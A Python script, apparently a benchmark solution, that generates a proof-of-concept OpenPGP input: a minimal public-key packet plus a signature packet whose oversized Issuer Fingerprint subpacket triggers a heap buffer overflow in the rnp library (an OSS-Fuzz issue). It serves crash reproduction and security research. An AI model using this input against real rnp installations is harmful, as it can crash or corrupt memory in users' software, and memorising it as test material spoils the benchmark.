import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a heap buffer overflow in rnp (oss-fuzz:42537670).

        The vulnerability is triggered by a malformed 'Issuer Fingerprint' signature
        subpacket (type 33). If the fingerprint length specified in this subpacket
        is greater than the maximum allowed size (64 bytes), the rnp library
        parses it, logs a warning, but continues processing. This leads to an
        inconsistent internal state where a key object stores an oversized
        fingerprint length.

        Later, when rnp_key_get_fingerprint() is called, this oversized length
        is used in a memcpy operation to a fixed-size buffer, causing a buffer
        overflow. The OSS-Fuzz crash report indicates a write of size 236, so
        we use that length to construct the malicious subpacket.

        The PoC consists of two OpenPGP packets:
        1. A minimal, parsable Public-Key packet.
        2. A Signature packet that refers to this key and contains the
           malicious 'Issuer Fingerprint' subpacket.
        """

        # 1. Construct a minimal Public-Key Packet (Tag 6)
        # A dummy v4 RSA key that is parsable.
        key_material = (
            b'\x04'  # version 4
            + struct.pack('!I', 0)  # creation time
            + b'\x01'  # pubkey algo: RSA
            + struct.pack('!H', 8)  # n length in bits
            + b'\xAA'  # n value (dummy)
            + struct.pack('!H', 17) # e length in bits (for 65537)
            + b'\x01\x00\x01' # e value
        )
        
        # New format packet header for Public Key. Length is < 192, so one octet.
        pubkey_packet = b'\xC6' + bytes([len(key_material)]) + key_material

        # 2. Construct a Signature Packet (Tag 2) with the malicious subpacket.
        
        # Use a fingerprint length of 236, as seen in the crash report.
        fingerprint_len = 236
        
        # The body of the Issuer Fingerprint subpacket (type 33).
        # Format: [version (1 octet)][fingerprint data (N octets)]
        fp_subpacket_body = b'\x04' + (b'\x00' * fingerprint_len)
        
        # The full subpacket structure: [length][type][body].
        # The length field covers the type octet and the body.
        subpacket_type = b'\x21' # Issuer Fingerprint
        subpacket_data_len = len(subpacket_type) + len(fp_subpacket_body) # 1 + 237 = 238
        
        # Per RFC 4880 Sec 5.2.3.1, for lengths >= 192, a two-octet length is used.
        # length = ((c1 - 192) << 8) + c2 + 192
        c1 = ((subpacket_data_len - 192) >> 8) + 192
        c2 = (subpacket_data_len - 192) & 0xFF
        subpacket_len_bytes = bytes([c1, c2])
        
        issuer_fp_subpacket = subpacket_len_bytes + subpacket_type + fp_subpacket_body

        # Construct the rest of the signature packet's body
        sig_body = (
            b'\x04' # version 4
            + b'\x10' # sig type: generic certification
            + b'\x01' # pubkey algo: RSA (must match key)
            + b'\x08' # hash algo: SHA256
            + struct.pack('!H', len(issuer_fp_subpacket)) # hashed subpackets length
            + issuer_fp_subpacket
            + struct.pack('!H', 0) # unhashed subpackets length
            + b'\x00\x00' # left 16 bits of hash (dummy)
            + struct.pack('!H', 8) # signature MPI 's' length in bits
            + b'\xBB' # signature MPI 's' value (dummy)
        )

        # New format packet header for Signature packet.
        # The length encoding is similar to subpackets.
        sig_body_len = len(sig_body)
        if sig_body_len < 192:
            sig_len_bytes = bytes([sig_body_len])
        elif sig_body_len < 8384:
            val = sig_body_len - 192
            c1 = (val >> 8) + 192
            c2 = val & 0xFF
            sig_len_bytes = bytes([c1, c2])
        else:
            # 5-octet length for very large packets.
            sig_len_bytes = b'\xFF' + struct.pack('!I', sig_body_len)

        sig_packet = b'\xC2' + sig_len_bytes + sig_body
        
        poc = pubkey_packet + sig_packet
        return poc